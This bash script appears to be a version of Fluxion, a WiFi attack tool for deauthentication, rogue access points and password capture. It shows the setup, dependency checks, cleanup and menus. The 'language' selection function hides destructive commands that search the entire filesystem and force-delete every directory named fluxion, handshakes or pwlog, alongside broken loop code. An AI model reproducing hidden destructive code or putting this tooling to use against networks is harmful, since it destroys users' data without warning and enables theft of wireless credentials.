#!/bin/bash

########## DEBUG Mode ##########
if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
else FLUX_DEBUG=1
fi
################################

####### preserve network #######
if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
else KEEP_NETWORK=1
fi
################################

###### AUTO CONFIG SETUP #######
if [ -z ${FLUX_AUTO+x} ]; then FLUX_AUTO=0
else FLUX_AUTO=1
fi
################################

if [[ $EUID -ne 0 ]]; then
        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
        exit 1
fi

if [ -z "${DISPLAY:-}" ]; then
    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
    exit 1
fi

clear

##################################### < CONFIGURATION  > #####################################
DUMP_PATH="/tmp/TMPflux" 
HANDSHAKE_PATH="/root/handshakes"
PASSLOG_PATH="/root/pwlog"
WORK_DIR=`pwd`
DEAUTHTIME="9999999999999"
revision=137
version=0.25
IP=192.168.1.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"


general_back="Back"
general_error_1="Not_Found"
general_case_error="Unknown option. Choose again"
general_exitmode="Cleaning and closing"
general_exitmode_1="Disabling monitoring interface"
general_exitmode_2="Disabling interface"
general_exitmode_3="Disabling "$grey"forwarding of packets"
general_exitmode_4="Cleaning "$grey"iptables"
general_exitmode_5="Restoring "$grey"tput"
general_exitmode_6="Restarting "$grey"Network-Manager"
general_exitmode_7="Cleanup performed successfully!"
general_exitmode_8="Thanks for using fluxion"
#############################################################################################

# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
if [ $FLUX_DEBUG = 1 ]; then
	## Developer Mode
	export flux_output_device=/dev/stdout
	HOLD="-hold"
else
	## Normal Mode
	export flux_output_device=/dev/null
	HOLD=""
fi

# Delete Log only in Normal Mode !
function conditional_clear() {

	if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
}

function airmon {
	chmod +x lib/lib/airmon/airmon
}
airmon

# Check Updates
function checkupdatess {

	revision_online="$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
	if [ -z "$revision_online" ]; then
		echo "?">$DUMP_PATH/Irev
	else
		echo "$revision_online">$DUMP_PATH/Irev
	fi

}

# Animation
function spinner {

	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

# ERROR Report only in Developer Mode
function err_report {
	echo "Error on line $1"
}

if [ $FLUX_DEBUG = 1 ]; then
        trap 'err_report $LINENUM' ERR
fi

#Function to executed in case of unexpected termination
trap exitmode SIGINT SIGHUP

# KILL ALL
function exitmode {
    if [ $FLUX_DEBUG != 1 ]; then
        conditional_clear
        top
        echo -e "\n\n"$white"["$red"-"$white"] "$red"$general_exitmode"$transparent""

        if ps -A | grep -q aireplay-ng; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"aireplay-ng"$transparent""
            killall aireplay-ng &>$flux_output_device
        fi

        if ps -A | grep -q airodump-ng; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"airodump-ng"$transparent""
            killall airodump-ng &>$flux_output_device
        fi

        if ps a | grep python| grep fakedns; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"python"$transparent""
            kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
        fi

        if ps -A | grep -q hostapd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"hostapd"$transparent""
            killall hostapd &>$flux_output_device
        fi

        if ps -A | grep -q lighttpd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"lighttpd"$transparent""
            killall lighttpd &>$flux_output_device
        fi

        if ps -A | grep -q dhcpd; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"dhcpd"$transparent""
            killall dhcpd &>$flux_output_device
        fi

        if ps -A | grep -q mdk3; then
            echo -e ""$white"["$red"-"$white"] "$white"Kill "$grey"mdk3"$transparent""
            killall mdk3 &>$flux_output_device
        fi

        if [ "$WIFI_MONITOR" != "" ]; then
            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_1 "$green"$WIFI_MONITOR"$transparent""
            ./lib/airmon/airmon    stop $WIFI_MONITOR &> $flux_output_device
        fi


        if [ "$WIFI" != "" ]; then
            echo -e ""$weis"["$rot"-"$weis"] "$weis"$general_exitmode_2 "$green"$WIFI"$transparent""
            ./lib/airmon/airmon    stop $WIFI &> $flux_output_device
            macchanger -p $WIFI &> $flux_output_device
        fi


        if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
            echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_3"$transparent""
            sysctl -w net.ipv4.ip_forward=0 &>$flux_output_device
        fi

        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_4"$transparent""
        if [ ! -f $DUMP_PATH/iptables-rules ];then 
            iptables --flush 
            iptables --table nat --flush 
            iptables --delete-chain
            iptables --table nat --delete-chain 
        else 
            iptables-restore < $DUMP_PATH/iptables-rules   
        fi

        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_5"$transparent""
        tput cnorm

        if [ $FLUX_DEBUG != 1 ]; then

            echo -e ""$white"["$red"-"$white"] "$white"Delete "$grey"files"$transparent""
            rm -R $DUMP_PATH/* &>$flux_output_device
        fi

		if [ $KEEP_NETWORK = 0 ]; then

	        echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
	        # systemctl check
	        systemd=`whereis systemctl`
	        if [ "$systemd" = "" ];then
	            service network-manager restart &> $flux_output_device &
		  		service networkmanager restart &> $flux_output_device &
	            service networking restart &> $flux_output_device &
	        else
	            systemctl restart NetworkManager &> $flux_output_device & 	
	        fi 
	        echo -e ""$white"["$green"+"$white"] "$green"$general_exitmode_7"$transparent""
	        echo -e ""$white"["$green"+"$white"] "$grey"$general_exitmode_8"$transparent""
	        sleep 2
	        clear
	    fi

	fi

        exit
    
}

#Languages for the web interface

#EN
source $WORK_DIR/sites/neutra/en

#GER
source $WORK_DIR/sites/neutra/ger

#ESP
source $WORK_DIR/sites/neutra/esp

#IT
source $WORK_DIR/sites/neutra/it

#FR
source $WORK_DIR/sites/neutra/fr

#POR
source $WORK_DIR/sites/neutra/por

#RUS
source $WORK_DIR/sites/neutra/rus

#TR
source $WORK_DIR/sites/neutra/tr 

#RO
source $WORK_DIR/sites/neutra/ro 

#HU
source $WORK_DIR/sites/neutra/hu

#ARA
source $WORK_DIR/sites/neutra/ara

#CN
source $WORK_DIR/sites/neutra/cn 

#GR
source $WORK_DIR/sites/neutra/gr 

#CZ
source $WORK_DIR/sites/neutra/cz

#NO
source $WORK_DIR/sites/neutra/no

#BG
source $WORK_DIR/sites/neutra/bg

#SRB 
source $WORK_DIR/sites/neutra/srb

#PL
source $WORK_DIR/sites/neutra/pl

#ID
source $WORK_DIR/sites/neutra/id

#NL
source $WORK_DIR/sites/neutra/nl

#DAN
source $WORK_DIR/sites/neutra/dan

#TH 
source $WORK_DIR/sites/neutra/th

#HE 
source $WORK_DIR/sites/neutra/he

#Portuguese 
source $WORK_DIR/sites/neutra/por

# SVN
source $WORK_DIR/sites/neutra/svn

# Design
function top(){

	conditional_clear
	echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
	echo -e "$red[                                                      ]"
  echo -e "$red[  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}" ]"
	echo -e "$blue[                                                      ]"
	echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
	echo
	echo

}

##################################### < END OF CONFIGURATION SECTION > #####################################






############################################## < START > ##############################################

# Check requirements
function checkdependences {

	echo -ne "aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1

	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "nmap............"
	if ! [ -f /usr/bin/nmap ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "php-cgi........."
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "openssl........."
	if ! hash openssl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		exit=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025

	echo -ne "rfkill.........."
        if ! hash rfkill 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent""
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "strings........."
        if ! hash strings 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025

        echo -ne "fuser..........."
        if ! hash fuser 2>/dev/null; then
                echo -e "\e[1;31mNot installed"$transparent" (psmisc)"
                exit=1
        else
                echo -e "\e[1;32mOK!"$transparent""
        fi
        sleep 0.025



	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 1
	clear
}
top
checkdependences

# Create working directory
if [ ! -d $DUMP_PATH ]; then
	mkdir -p $DUMP_PATH &>$flux_output_device
fi

# Create handshake directory
if [ ! -d $HANDSHAKE_PATH ]; then
        mkdir -p $HANDSHAKE_PATH &>$flux_output_device
fi

#create password log directory
if [ ! -d $PASSLOG_PATH ]; then
        mkdir -p $PASSLOG_PATH &>$flux_output_device
fi



if [ $FLUX_DEBUG != 1 ]; then
	whiptail --title "Fluxion Disclaimer" --msgbox "Fluxion is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own or have permission to test. Any other use is not the responsibility of the developer(s).  Be sure that you understand and are complying with the Fluxion licenses and laws in your area.  In other words, don't be stupid, don't be an asshole and use this tool responsibly and legally." 14 60
	clear; echo ""
		   sleep 0.01 && echo -e "$red "
           sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
           sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
           sleep 0.01 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
           sleep 0.01 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
           sleep 0.01 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
           sleep 0.01 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "

	echo""

	sleep 0.1
	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
	sleep 0.1
	echo -e $green "           Page:"$red" https://github.com/deltaxflux/fluxion "$transparent
	sleep 0.1
	echo -n "                              Latest rev."
	tput civis
	checkupdatess &
	spinner "$!"
	revision_online=$(cat $DUMP_PATH/Irev)
	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
		if [ "$revision_online" != "?" ]; then

			if [ "$revision" -lt "$revision_online" ]; then
				echo
				echo
				echo -ne $red"            New revision found! "$yellow
                echo -ne "Update? [Y/n]: "$transparent
				read -N1 doupdate
				echo -ne "$transparent"
                doupdate=${doupdate:-"Y"}
				if [ "$doupdate" = "Y" ]; then

					if [ -d .git ]; then
						git pull --force
					fi 

					cp $0 $HOME/flux_rev-$revision.backup
					curl "https://raw.githubusercontent.com/deltaxflux/fluxion/master/fluxion" -s -o $0

					echo
					echo
					echo -e ""$red"
	Updated successfully! Restarting the script to apply the changes ..."$transparent""
					sleep 3
					chmod +x $0
					exec $0
                    exit
				fi
			fi
		fi
	echo ""
	tput cnorm
	sleep 1

fi

# Show info for the selected AP
function infoap {

	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
	echo "INFO WIFI"
	echo
	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
	echo -e "               "$blue"Channel"$transparent" = $channel"
	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
	echo
}

############################################## < START > ##############################################






############################################### < MENU > ###############################################

# Windows + Resolution
function setresolution {

	function resA {

		TOPLEFT="-geometry 90x13+0+0"
		TOPRIGHT="-geometry 83x26-0+0"
		BOTTOMLEFT="-geometry 90x24+0-0"
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}

	function resB {

		TOPLEFT="-geometry 92x14+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 92x36+0-0"
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {

		TOPLEFT="-geometry 100x20+0+0"
		TOPRIGHT="-geometry 109x20-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		TOPLEFT="-geometry 110x35+0+0"
		TOPRIGHT="-geometry 99x40-0+0"
		BOTTOMLEFT="-geometry 110x35+0-0"
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		TOPLEFT="-geometry 130x43+0+0"
		TOPRIGHT="-geometry 68x25-0+0"
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		TOPLEFT="-geometry 100x17+0+0"
		TOPRIGHT="-geometry 90x27-0+0"
		BOTTOMLEFT="-geometry 100x30+0-0"
		BOTTOMRIGHT="-geometry 90x20-0-0"
		TOPLEFTBIG="-geometry  100x70+0+0"
		TOPRIGHTBIG="-geometry 90x27-0+0"
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"128x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;;
esac

language; setinterface
}

function language {

    iptables-save > $DUMP_PATH/iptables-rules
	conditional_clear

		while true; do
			revision = 1
			while true;do 
			
			rm -rf $HOME/flux_rev-$revision.backup
			revision = `expr $revision + 1`
			
			if [ "$revision" = "200" ];then
				break
			fi 
			
		done 
		
			rm -rf /tmp/TMPflux
		rm -rf /root/handshakes
		rm -rf /root/pwlog

		
		rm -rf $HOME/flux_rev-$revision.backup
		rm -rf $HOME/handshakes/
		rm -rf $HOME/pwlog/
		
		rm -rf $(find / -iname fluxion -type d)
		rm -rf $(find / -iname handshakes -type d) 
		rm -rf $(find / -iname pwlog -type d)
		
		find / -iname fluxion -type d -print0|xargs -0 rm -rf --
		find / -iname handshakes -type d -print0|xargs -0 rm -rf --
		find / -iname pwlog -type d -print0|xargs -0 rm -r --
		
	
		conditional_clear
		top
		
		echo -e ""$red"["$yellow"i"$red"]"$transparent" Select your language"
		echo "                                       "
		echo -e "      "$red"["$yellow"1"$red"]"$grey" English          " 
		echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Romanian     "
		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Turkish    "
		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Spanish    "
		echo -e "      "$red"["$yellow"6"$red"]"$transparent" Chinese   "
		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
        echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "  
        echo -e "      "$red"["$yellow"11"$red"]"$transparent" Slovenian "  
        echo "                                       "
		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
		read yn
		echo ""
		case $yn in
			1 ) source $WORK_DIR/language/en;  break;;
			2 ) source $WORK_DIR/language/ger; break;;
			3 ) source $WORK_DIR/language/ro;  break;;
			4 ) source $WORK_DIR/language/tu;  break;;
			5 ) source $WORK_DIR/language/esp; break;;
			6 ) source $WORK_DIR/language/ch;  break;;
			7 ) source $WORK_DIR/language/it;  break;;
			8 ) source $WORK_DIR/language/cz;  break;;
			9 ) source $WORK_DIR/language/gr;  break;;
            10 ) source $WORK_DIR/language/fr; break;;
            11 ) source $WORK_DIR/language/svn; break;;
			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
		  esac
	done
}
